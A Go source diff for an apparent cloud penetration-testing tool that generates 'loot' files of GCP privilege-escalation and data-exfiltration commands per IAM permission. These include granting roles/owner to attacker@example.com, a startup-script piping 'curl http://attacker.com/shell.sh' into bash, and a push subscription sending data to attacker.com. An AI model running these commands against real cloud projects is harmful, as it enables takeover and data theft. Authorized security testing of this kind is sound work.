@@ -1231,6 +1231,11 @@ func (m *WhoAmIModule) generateLoot() {
 			if path.Confidence == "potential" {
 				confidenceNote = "# NOTE: This is a POTENTIAL path based on role name. Actual exploitation depends on resource configuration.\n"
 			}
+			// Use the stored command if available, otherwise generate one
+			exploitCmd := path.Command
+			if exploitCmd == "" {
+				exploitCmd = generatePrivescExploitCmd(path.Permission, path.ProjectID)
+			}
 			m.LootMap["whoami-privesc"].Contents += fmt.Sprintf(
 				"## %s\n"+
 					"# %s\n"+
@@ -1246,7 +1251,7 @@ func (m *WhoAmIModule) generateLoot() {
 				path.Confidence,
 				path.RequiredPerms,
 				confidenceNote,
-				path.Command,
+				exploitCmd,
 			)
 		}
 
@@ -1288,27 +1293,175 @@ func (m *WhoAmIModule) generateLoot() {
 	}
 }
 
+// generatePrivescExploitCmd generates an exploit command for a privilege escalation permission
+func generatePrivescExploitCmd(permission, projectID string) string {
+	switch permission {
+	// Service Account Impersonation
+	case "iam.serviceAccounts.getAccessToken":
+		return fmt.Sprintf("gcloud auth print-access-token --impersonate-service-account=SA_EMAIL@%s.iam.gserviceaccount.com", projectID)
+	case "iam.serviceAccounts.implicitDelegation":
+		return fmt.Sprintf("# Chain impersonation through intermediary SA\ngcloud auth print-access-token --impersonate-service-account=TARGET_SA@%s.iam.gserviceaccount.com", projectID)
+	case "iam.serviceAccounts.signBlob":
+		return fmt.Sprintf("gcloud iam service-accounts sign-blob --iam-account=SA_EMAIL@%s.iam.gserviceaccount.com input.txt output.sig", projectID)
+	case "iam.serviceAccounts.signJwt":
+		return fmt.Sprintf("gcloud iam service-accounts sign-jwt --iam-account=SA_EMAIL@%s.iam.gserviceaccount.com jwt.json signed_jwt.txt", projectID)
+
+	// Service Account Key Creation
+	case "iam.serviceAccountKeys.create":
+		return fmt.Sprintf("gcloud iam service-accounts keys create key.json --iam-account=SA_EMAIL@%s.iam.gserviceaccount.com", projectID)
+
+	// IAM Policy Modification
+	case "resourcemanager.projects.setIamPolicy":
+		return fmt.Sprintf("gcloud projects add-iam-policy-binding %s --member=user:attacker@example.com --role=roles/owner", projectID)
+	case "resourcemanager.folders.setIamPolicy":
+		return fmt.Sprintf("gcloud resource-manager folders add-iam-policy-binding FOLDER_ID --member=user:attacker@example.com --role=roles/owner")
+	case "resourcemanager.organizations.setIamPolicy":
+		return "gcloud organizations add-iam-policy-binding ORG_ID --member=user:attacker@example.com --role=roles/owner"
+	case "iam.serviceAccounts.setIamPolicy":
+		return fmt.Sprintf("gcloud iam service-accounts add-iam-policy-binding SA_EMAIL@%s.iam.gserviceaccount.com --member=user:attacker@example.com --role=roles/iam.serviceAccountTokenCreator", projectID)
+	case "iam.roles.update":
+		return fmt.Sprintf("gcloud iam roles update ROLE_ID --project=%s --add-permissions=iam.serviceAccounts.getAccessToken", projectID)
+
+	// Cloud Functions
+	case "cloudfunctions.functions.create":
+		return fmt.Sprintf("gcloud functions deploy privesc-func --runtime=python39 --trigger-http --service-account=TARGET_SA@%s.iam.gserviceaccount.com --entry-point=main --source=. --project=%s", projectID, projectID)
+	case "cloudfunctions.functions.update":
+		return fmt.Sprintf("gcloud functions deploy EXISTING_FUNC --service-account=TARGET_SA@%s.iam.gserviceaccount.com --project=%s", projectID, projectID)
+	case "cloudfunctions.functions.sourceCodeSet":
+		return fmt.Sprintf("gcloud functions deploy FUNC_NAME --source=gs://BUCKET/malicious-code.zip --project=%s", projectID)
+
+	// Compute Engine
+	case "compute.instances.create":
+		return fmt.Sprintf("gcloud compute instances create privesc-vm --service-account=TARGET_SA@%s.iam.gserviceaccount.com --scopes=cloud-platform --project=%s", projectID, projectID)
+	case "compute.instances.setServiceAccount":
+		return fmt.Sprintf("gcloud compute instances set-service-account INSTANCE_NAME --service-account=TARGET_SA@%s.iam.gserviceaccount.com --zone=ZONE --project=%s", projectID, projectID)
+	case "compute.instances.setMetadata":
+		return fmt.Sprintf("gcloud compute instances add-metadata INSTANCE_NAME --metadata=startup-script='curl http://attacker.com/shell.sh | bash' --zone=ZONE --project=%s", projectID)
+
+	// Cloud Run
+	case "run.services.create":
+		return fmt.Sprintf("gcloud run deploy privesc-svc --image=IMAGE --service-account=TARGET_SA@%s.iam.gserviceaccount.com --project=%s", projectID, projectID)
+	case "run.services.update":
+		return fmt.Sprintf("gcloud run services update SERVICE_NAME --service-account=TARGET_SA@%s.iam.gserviceaccount.com --project=%s", projectID, projectID)
+
+	// Cloud Scheduler / Tasks
+	case "cloudscheduler.jobs.create":
+		return fmt.Sprintf("gcloud scheduler jobs create http privesc-job --schedule='* * * * *' --uri=https://TARGET --oidc-service-account-email=TARGET_SA@%s.iam.gserviceaccount.com --project=%s", projectID, projectID)
+	case "cloudtasks.tasks.create":
+		return fmt.Sprintf("gcloud tasks create-http-task --queue=QUEUE --url=https://TARGET --oidc-service-account-email=TARGET_SA@%s.iam.gserviceaccount.com --project=%s", projectID, projectID)
+
+	// Kubernetes / GKE
+	case "container.clusters.getCredentials":
+		return fmt.Sprintf("gcloud container clusters get-credentials CLUSTER_NAME --zone=ZONE --project=%s", projectID)
+
+	// Deployment Manager
+	case "deploymentmanager.deployments.create":
+		return fmt.Sprintf("gcloud deployment-manager deployments create privesc-deploy --config=config.yaml --project=%s", projectID)
+
+	// Composer / Airflow
+	case "composer.environments.create":
+		return fmt.Sprintf("gcloud composer environments create privesc-env --location=REGION --service-account=TARGET_SA@%s.iam.gserviceaccount.com --project=%s", projectID, projectID)
+
+	// Dataproc
+	case "dataproc.clusters.create":
+		return fmt.Sprintf("gcloud dataproc clusters create privesc-cluster --service-account=TARGET_SA@%s.iam.gserviceaccount.com --region=REGION --project=%s", projectID, projectID)
+
+	// Dataflow
+	case "dataflow.jobs.create":
+		return fmt.Sprintf("gcloud dataflow jobs run privesc-job --gcs-location=gs://dataflow-templates --service-account-email=TARGET_SA@%s.iam.gserviceaccount.com --project=%s", projectID, projectID)
+
+	// API Keys
+	case "apikeys.keys.create":
+		return fmt.Sprintf("gcloud alpha services api-keys create --project=%s", projectID)
+
+	// Storage (bucket-level)
+	case "storage.buckets.setIamPolicy":
+		return fmt.Sprintf("gsutil iam ch user:attacker@example.com:objectViewer gs://BUCKET_NAME")
+
+	// Pub/Sub
+	case "pubsub.topics.setIamPolicy":
+		return fmt.Sprintf("gcloud pubsub topics add-iam-policy-binding TOPIC --member=user:attacker@example.com --role=roles/pubsub.publisher --project=%s", projectID)
+	case "pubsub.subscriptions.setIamPolicy":
+		return fmt.Sprintf("gcloud pubsub subscriptions add-iam-policy-binding SUBSCRIPTION --member=user:attacker@example.com --role=roles/pubsub.subscriber --project=%s", projectID)
+
+	// Service Usage
+	case "serviceusage.services.enable":
+		return fmt.Sprintf("gcloud services enable iamcredentials.googleapis.com --project=%s", projectID)
+
+	default:
+		return fmt.Sprintf("# Permission: %s - Refer to GCP documentation for exploitation", permission)
+	}
+}
+
 // generateExfilExploitCmd generates an exploit command for a data exfil permission
 func generateExfilExploitCmd(permission, projectID string) string {
 	switch permission {
+	// Compute
 	case "compute.images.create":
 		return fmt.Sprintf("gcloud compute images create exfil-image --source-disk=DISK_NAME --source-disk-zone=ZONE --project=%s", projectID)
 	case "compute.snapshots.create":
 		return fmt.Sprintf("gcloud compute snapshots create exfil-snapshot --source-disk=DISK_NAME --source-disk-zone=ZONE --project=%s", projectID)
+	case "compute.disks.createSnapshot":
+		return fmt.Sprintf("gcloud compute disks snapshot DISK_NAME --snapshot-names=exfil-snapshot --zone=ZONE --project=%s", projectID)
+
+	// Logging
 	case "logging.sinks.create":
 		return fmt.Sprintf("gcloud logging sinks create exfil-sink pubsub.googleapis.com/projects/EXTERNAL_PROJECT/topics/stolen-logs --project=%s", projectID)
+	case "logging.logEntries.list":
+		return fmt.Sprintf("gcloud logging read 'logName:projects/%s/logs/' --limit=1000 --project=%s", projectID, projectID)
+
+	// Cloud SQL
 	case "cloudsql.instances.export":
 		return fmt.Sprintf("gcloud sql export sql INSTANCE_NAME gs://BUCKET/export.sql --database=DB_NAME --project=%s", projectID)
+	case "cloudsql.backupRuns.create":
+		return fmt.Sprintf("gcloud sql backups create --instance=INSTANCE_NAME --project=%s", projectID)
+
+	// Pub/Sub
 	case "pubsub.subscriptions.create":
 		return fmt.Sprintf("gcloud pubsub subscriptions create exfil-sub --topic=TOPIC_NAME --push-endpoint=https://attacker.com/collect --project=%s", projectID)
+	case "pubsub.subscriptions.consume":
+		return fmt.Sprintf("gcloud pubsub subscriptions pull SUBSCRIPTION_NAME --limit=100 --project=%s", projectID)
+
+	// BigQuery
 	case "bigquery.tables.export":
 		return fmt.Sprintf("bq extract --destination_format=CSV '%s:DATASET.TABLE' gs://BUCKET/export.csv", projectID)
+	case "bigquery.tables.getData":
+		return fmt.Sprintf("bq query --use_legacy_sql=false 'SELECT * FROM `%s.DATASET.TABLE` LIMIT 1000'", projectID)
+	case "bigquery.jobs.create":
+		return fmt.Sprintf("bq query --use_legacy_sql=false --destination_table=%s:DATASET.EXFIL_TABLE 'SELECT * FROM `%s.DATASET.SOURCE_TABLE`'", projectID, projectID)
+
+	// Storage Transfer
 	case "storagetransfer.jobs.create":
 		return fmt.Sprintf("gcloud transfer jobs create gs://SOURCE_BUCKET s3://DEST_BUCKET --project=%s", projectID)
+
+	// Secret Manager
 	case "secretmanager.versions.access":
 		return fmt.Sprintf("gcloud secrets versions access latest --secret=SECRET_NAME --project=%s", projectID)
+	case "secretmanager.secrets.list":
+		return fmt.Sprintf("gcloud secrets list --project=%s", projectID)
+
+	// Cloud Storage
 	case "storage.objects.get":
 		return fmt.Sprintf("gsutil cp gs://BUCKET/OBJECT ./local-file --project=%s", projectID)
+	case "storage.objects.list":
+		return fmt.Sprintf("gsutil ls -r gs://BUCKET_NAME --project=%s", projectID)
+	case "storage.buckets.list":
+		return fmt.Sprintf("gsutil ls --project=%s", projectID)
+
+	// Firestore / Datastore
+	case "datastore.entities.list":
+		return fmt.Sprintf("gcloud datastore export gs://BUCKET --project=%s", projectID)
+	case "firestore.documents.list":
+		return fmt.Sprintf("gcloud firestore export gs://BUCKET --project=%s", projectID)
+
+	// Spanner
+	case "spanner.databases.read":
+		return fmt.Sprintf("gcloud spanner databases execute-sql DATABASE --instance=INSTANCE --sql='SELECT * FROM TABLE' --project=%s", projectID)
+
+	// KMS (for decrypting encrypted data)
+	case "cloudkms.cryptoKeyVersions.useToDecrypt":
+		return fmt.Sprintf("gcloud kms decrypt --location=LOCATION --keyring=KEYRING --key=KEY --ciphertext-file=encrypted.txt --plaintext-file=decrypted.txt --project=%s", projectID)
+
 	default:
 		return fmt.Sprintf("# Permission: %s - Refer to GCP documentation", permission)
 	}
@@ -1622,8 +1775,9 @@ func (m *WhoAmIModule) buildTables() []internal.TableFile {
 func (m *WhoAmIModule) collectLootFiles() []internal.LootFile {
 	var lootFiles []internal.LootFile
 	for _, loot := range m.LootMap {
-		// Include loot files that have content and aren't just header comments
-		if loot.Contents != "" && !strings.HasSuffix(loot.Contents, "# Generated by CloudFox\n\n") {
+		// Include loot files that have content beyond the header comments
+		// Headers end with "# WARNING: Only use with proper authorization!\n\n"
+		if loot.Contents != "" && !strings.HasSuffix(loot.Contents, "# WARNING: Only use with proper authorization!\n\n") {
 			lootFiles = append(lootFiles, *loot)
 		}
 	}
